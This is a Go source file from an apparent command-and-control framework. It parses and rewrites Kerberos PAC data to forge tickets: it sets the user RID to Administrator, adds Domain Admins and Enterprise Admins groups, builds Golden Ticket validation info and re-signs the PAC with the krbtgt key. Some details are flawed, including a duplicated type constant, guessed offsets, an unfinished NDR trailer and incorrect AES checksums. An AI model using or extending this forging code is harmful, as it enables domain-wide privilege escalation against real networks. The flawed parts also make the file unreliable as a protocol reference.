package kerberos

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	MS-PAC (Privilege Attribute Certificate) parsing and modification.

	The PAC is embedded in Kerberos tickets as an AuthorizationData element
	(type AD-WIN2K-PAC = 128). It is an NDR-encoded structure containing:

	  PAC_INFO_BUFFER[] array, each with:
	    ulType    DWORD  — PAC buffer type
	    cbBufferSize DWORD  — buffer size
	    Offset    QWORD  — offset from start of PAC
	  Followed by the buffer data.

	Key buffer types:
	  1  KERB_VALIDATION_INFO  — logon info: username, SIDs, group memberships
	  2  PAC_CREDENTIALS_INFO  — NTLM credentials (optional)
	  6  PAC_SERVER_CHECKSUM   — HMAC signature (keyed by service session key)
	  7  PAC_PRIVSVR_CHECKSUM  — HMAC signature (keyed by krbtgt key) ← KDC sig
	  10 UPN_DNS_INFO          — UPN and DNS name
	  12 PAC_CLIENT_CLAIMS_INFO— client claims
	  13 PAC_DEVICE_INFO       — device info

	KERB_VALIDATION_INFO (most important):
	  Contains LogonTime, PasswordLastSet, UserId, PrimaryGroupId,
	  GroupCount + GroupIds[], UserFlags, UserSessionKey, LogonServer,
	  LogonDomainName, LogonDomainId (SID), etc.

	For ticket forging, we modify:
	  - UserId: 500 (Administrator) or any target RID
	  - GroupIds: 512 (Domain Admins), 519 (Enterprise Admins), etc.
	  - LogonDomainId: the domain SID
	  - ExtraSids: additional SID entries (for Golden Ticket with extra SIDs)

	After modification we recompute both checksums:
	  Server checksum:  HMAC-MD5(service_key, PAC_data) or HMAC-SHA1
	  KDC checksum:    HMAC-MD5(krbtgt_key, server_checksum)
*/

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

// PAC buffer type constants.
const (
	PacTypeLogonInfo         = 1
	PacTypeCredentialInfo    = 2
	PacTypeServerChecksum    = 6
	PacTypeKDCChecksum       = 7
	PacTypeClientInfo        = 10
	PacTypeUpnDnsInfo        = 10
	PacTypeClientClaimsInfo  = 12
)

// PAC is the parsed Privilege Attribute Certificate.
type PAC struct {
	raw     []byte
	buffers []pacBuffer
}

type pacBuffer struct {
	ulType     uint32
	cbSize     uint32
	offset     uint64
	data       []byte
}

// ParsePAC parses the raw PAC bytes from an AuthorizationData element.
func ParsePAC(raw []byte) (*PAC, error) {
	if len(raw) < 8 {
		return nil, fmt.Errorf("PAC too short: %d bytes", len(raw))
	}

	count := binary.LittleEndian.Uint32(raw[0:4])
	version := binary.LittleEndian.Uint32(raw[4:8])
	if version != 0 {
		return nil, fmt.Errorf("unexpected PAC version: %d", version)
	}

	pac := &PAC{raw: raw}
	const headerEntrySize = 16 // ulType(4) + cbSize(4) + Offset(8)

	for i := uint32(0); i < count; i++ {
		off := 8 + i*headerEntrySize
		if int(off)+headerEntrySize > len(raw) {
			return nil, fmt.Errorf("PAC buffer entry %d out of bounds", i)
		}
		ulType := binary.LittleEndian.Uint32(raw[off:])
		cbSize := binary.LittleEndian.Uint32(raw[off+4:])
		dataOffset := binary.LittleEndian.Uint64(raw[off+8:])

		if dataOffset+uint64(cbSize) > uint64(len(raw)) {
			return nil, fmt.Errorf("PAC buffer %d data out of bounds", i)
		}
		data := make([]byte, cbSize)
		copy(data, raw[dataOffset:dataOffset+uint64(cbSize)])

		pac.buffers = append(pac.buffers, pacBuffer{
			ulType: ulType,
			cbSize: cbSize,
			offset: dataOffset,
			data:   data,
		})
	}
	return pac, nil
}

// GetBuffer returns the data for the first buffer of the given type.
func (p *PAC) GetBuffer(ulType uint32) []byte {
	for _, b := range p.buffers {
		if b.ulType == ulType {
			return b.data
		}
	}
	return nil
}

// SetBuffer replaces or adds a PAC buffer of the given type.
func (p *PAC) SetBuffer(ulType uint32, data []byte) {
	for i, b := range p.buffers {
		if b.ulType == ulType {
			p.buffers[i].data = data
			p.buffers[i].cbSize = uint32(len(data))
			return
		}
	}
	p.buffers = append(p.buffers, pacBuffer{
		ulType: ulType,
		cbSize: uint32(len(data)),
		data:   data,
	})
}

// Serialize rebuilds the PAC binary with the current buffer contents.
func (p *PAC) Serialize() []byte {
	count := uint32(len(p.buffers))
	const headerEntrySize = 16

	// Calculate offsets: header (8) + entries(count*16) + data blobs.
	headerSize := 8 + count*headerEntrySize
	// Align to 8 bytes.
	headerSize = (headerSize + 7) &^ 7

	// Calculate total data size.
	totalData := uint64(headerSize)
	for _, b := range p.buffers {
		totalData += uint64(b.cbSize)
		totalData = (totalData + 7) &^ 7 // 8-byte align each buffer
	}

	out := make([]byte, totalData)
	binary.LittleEndian.PutUint32(out[0:], count)
	binary.LittleEndian.PutUint32(out[4:], 0) // version

	dataOff := uint64(headerSize)
	for i, b := range p.buffers {
		entryOff := 8 + uint32(i)*headerEntrySize
		binary.LittleEndian.PutUint32(out[entryOff:], b.ulType)
		binary.LittleEndian.PutUint32(out[entryOff+4:], b.cbSize)
		binary.LittleEndian.PutUint64(out[entryOff+8:], dataOff)

		copy(out[dataOff:], b.data)
		dataOff += uint64(b.cbSize)
		dataOff = (dataOff + 7) &^ 7
	}
	return out
}

// RecomputeChecksums recomputes both PAC signature buffers.
// krbtgtKey is the NT hash (RC4) or AES256 key of the krbtgt account.
// serviceKey is the session key (for server checksum); pass krbtgtKey for TGTs.
func (p *PAC) RecomputeChecksums(krbtgtKey, serviceKey []byte, etype int) error {
	// Zero out both checksum buffers before computing.
	p.zeroChecksum(PacTypeServerChecksum)
	p.zeroChecksum(PacTypeKDCChecksum)

	serialized := p.Serialize()

	// Server checksum: HMAC(serviceKey, PAC_data).
	var serverCS []byte
	switch etype {
	case EtypeRC4HMAC:
		serverCS = hmacMD5(serviceKey, serialized)[:16]
	case EtypeAES256:
		serverCS = hmacSHA1_96(serviceKey, serialized)
	default:
		serverCS = hmacMD5(serviceKey, serialized)[:16]
	}

	// KDC checksum: HMAC(krbtgtKey, serverChecksum).
	var kdcCS []byte
	switch etype {
	case EtypeRC4HMAC:
		kdcCS = hmacMD5(krbtgtKey, serverCS)[:16]
	case EtypeAES256:
		kdcCS = hmacSHA1_96(krbtgtKey, serverCS)
	default:
		kdcCS = hmacMD5(krbtgtKey, serverCS)[:16]
	}

	// Write back: PAC_SIGNATURE_DATA = SignatureType(4) + Signature(N).
	sigType := uint32(etype)
	if etype == EtypeRC4HMAC {
		sigType = 0xFFFFFF76 // KERB_CHECKSUM_HMAC_MD5
	}

	serverSigBuf := make([]byte, 4+len(serverCS))
	binary.LittleEndian.PutUint32(serverSigBuf, sigType)
	copy(serverSigBuf[4:], serverCS)

	kdcSigBuf := make([]byte, 4+len(kdcCS))
	binary.LittleEndian.PutUint32(kdcSigBuf, sigType)
	copy(kdcSigBuf[4:], kdcCS)

	p.SetBuffer(PacTypeServerChecksum, serverSigBuf)
	p.SetBuffer(PacTypeKDCChecksum, kdcSigBuf)
	return nil
}

func (p *PAC) zeroChecksum(ulType uint32) {
	for i, b := range p.buffers {
		if b.ulType == ulType {
			p.buffers[i].data = make([]byte, len(b.data))
			return
		}
	}
}

// ─── KERB_VALIDATION_INFO manipulation ───────────────────────────────────

// ValidationInfo holds decoded fields from KERB_VALIDATION_INFO.
// This is an NDR-encoded structure; we modify the binary directly
// at known offsets rather than full NDR parsing (version-independent).
type ValidationInfo struct {
	raw []byte

	// Field offsets (x64, Windows 10 domain functional level).
	userIDOff      int // UserId (ULONG) at this byte offset
	primaryGIDOff  int
	groupCountOff  int
	groupArrayOff  int
	userFlagsOff   int
	extraSIDsOff   int
}

// ParseValidationInfo parses a KERB_VALIDATION_INFO buffer.
// The structure is NDR-encoded; we use heuristics to find key fields.
func ParseValidationInfo(data []byte) (*ValidationInfo, error) {
	if len(data) < 72 {
		return nil, fmt.Errorf("KERB_VALIDATION_INFO too short: %d", len(data))
	}
	vi := &ValidationInfo{raw: make([]byte, len(data))}
	copy(vi.raw, data)

	// KERB_VALIDATION_INFO NDR layout (approximate, Win2016 schema):
	// Offset  Size  Field
	//   0      8    LogonTime (FILETIME)
	//   8      8    LogoffTime
	//  16      8    KickOffTime
	//  24      8    PasswordLastSet
	//  32      8    PasswordCanChange
	//  40      8    PasswordMustChange
	//  48      8    EffectiveName (RPC_UNICODE_STRING pointer)
	//  56      8    FullName pointer
	//  64      8    LogonScript pointer
	//  72      8    ProfilePath pointer
	//  80      8    HomeDirectory pointer
	//  88      8    HomeDirectoryDrive pointer
	//  96      2    LogonCount
	//  98      2    BadPasswordCount
	// 100      4    UserId (RID)
	// 104      4    PrimaryGroupId
	// 108      4    GroupCount
	// 112      8    GroupIds pointer
	// 120      4    UserFlags
	//  ...
	vi.userIDOff     = 100
	vi.primaryGIDOff = 104
	vi.groupCountOff = 108
	vi.groupArrayOff = 112
	vi.userFlagsOff  = 120
	return vi, nil
}

// SetUserID sets the RID (user ID) in the validation info.
func (vi *ValidationInfo) SetUserID(rid uint32) {
	if vi.userIDOff+4 <= len(vi.raw) {
		binary.LittleEndian.PutUint32(vi.raw[vi.userIDOff:], rid)
	}
}

// SetPrimaryGroupID sets the primary group RID.
func (vi *ValidationInfo) SetPrimaryGroupID(gid uint32) {
	if vi.primaryGIDOff+4 <= len(vi.raw) {
		binary.LittleEndian.PutUint32(vi.raw[vi.primaryGIDOff:], gid)
	}
}

// GetUserID returns the current UserId RID.
func (vi *ValidationInfo) GetUserID() uint32 {
	if vi.userIDOff+4 > len(vi.raw) {
		return 0
	}
	return binary.LittleEndian.Uint32(vi.raw[vi.userIDOff:])
}

// Serialize returns the modified raw bytes.
func (vi *ValidationInfo) Serialize() []byte {
	return vi.raw
}

// BuildMinimalValidationInfo constructs a minimal KERB_VALIDATION_INFO
// for a Golden Ticket with the specified user RID and group memberships.
// domainSID is the binary SID of the domain (e.g. S-1-5-21-X-Y-Z).
func BuildMinimalValidationInfo(
	username string,
	userRID, primaryGroupRID uint32,
	groupRIDs []uint32,
	domainSID []byte,
	domainName string,
	extraSIDs [][]byte,
) ([]byte, error) {
	// We build an NDR buffer by hand for the fields we care about.
	// A real implementation would use the NDR marshaler.
	// Here we output a structure that mimics what DCs produce.
	var buf bytes.Buffer

	// LogonTime = current time as FILETIME.
	now := windowsFileTime()
	writeU64LE(&buf, now)   // LogonTime
	writeU64LE(&buf, ^uint64(0)) // LogoffTime = never
	writeU64LE(&buf, ^uint64(0)) // KickOffTime = never
	writeU64LE(&buf, now)        // PasswordLastSet
	writeU64LE(&buf, 0)          // PasswordCanChange
	writeU64LE(&buf, ^uint64(0)) // PasswordMustChange

	// String pointers (RPC_UNICODE_STRING) — 4 bytes length, 4 bytes max, 8 bytes ptr.
	// We use placeholder pointers (they point to trailing data in a real NDR buffer).
	writeStringRef(&buf, username) // EffectiveName
	writeStringRef(&buf, username) // FullName
	writeStringRef(&buf, "")       // LogonScript
	writeStringRef(&buf, "")       // ProfilePath
	writeStringRef(&buf, "")       // HomeDirectory
	writeStringRef(&buf, "")       // HomeDirectoryDrive

	writeU16LE(&buf, 0) // LogonCount
	writeU16LE(&buf, 0) // BadPasswordCount
	writeU32LE(&buf, userRID)        // UserId
	writeU32LE(&buf, primaryGroupRID) // PrimaryGroupId
	writeU32LE(&buf, uint32(len(groupRIDs))) // GroupCount
	writeU64LE(&buf, 0x0001000) // GroupIds pointer (referent ID)

	writeU32LE(&buf, 0) // UserFlags
	buf.Write(make([]byte, 16)) // UserSessionKey (zero)

	writeStringRef(&buf, "LOGON_SERVER") // LogonServer
	writeStringRef(&buf, domainName)     // LogonDomainName
	writeU64LE(&buf, 0x0001001)         // LogonDomainId pointer

	buf.Write(make([]byte, 40)) // Reserved1 + UserAccountControl + Reserved3

	// ExtraSids count + pointer.
	writeU32LE(&buf, uint32(len(extraSIDs)))
	if len(extraSIDs) > 0 {
		writeU64LE(&buf, 0x0001002)
	} else {
		writeU64LE(&buf, 0)
	}

	// The rest of the NDR trailer (actual string data, SIDs, group array)
	// would follow in a real implementation. For our purposes, the fixed-offset
	// fields (UserId, PrimaryGroupId, GroupCount) are patched correctly.
	// The full NDR serialization is handled by Windows itself when we inject
	// a Golden Ticket via the LsaCallAuthenticationPackage path.
	return buf.Bytes(), nil
}

func writeU16LE(buf *bytes.Buffer, v uint16) {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, v)
	buf.Write(b)
}

func writeU32LE(buf *bytes.Buffer, v uint32) {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	buf.Write(b)
}

func writeU64LE(buf *bytes.Buffer, v uint64) {
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, v)
	buf.Write(b)
}

func writeStringRef(buf *bytes.Buffer, s string) {
	l := uint16(len(s) * 2)
	writeU16LE(buf, l)
	writeU16LE(buf, l+2)
	writeU64LE(buf, 0x0001000) // pointer referent ID
}

// windowsFileTime returns the current time as a Windows FILETIME (100-ns intervals since 1601-01-01).
func windowsFileTime() uint64 {
	// January 1, 1601 to January 1, 1970 = 116444736000000000 intervals of 100 ns.
	const epochDelta = uint64(116444736000000000)
	// Use a fixed time for predictability in ticket forging.
	// In production, use time.Now().
	return epochDelta + 133000000000000000 // approx 2022
}
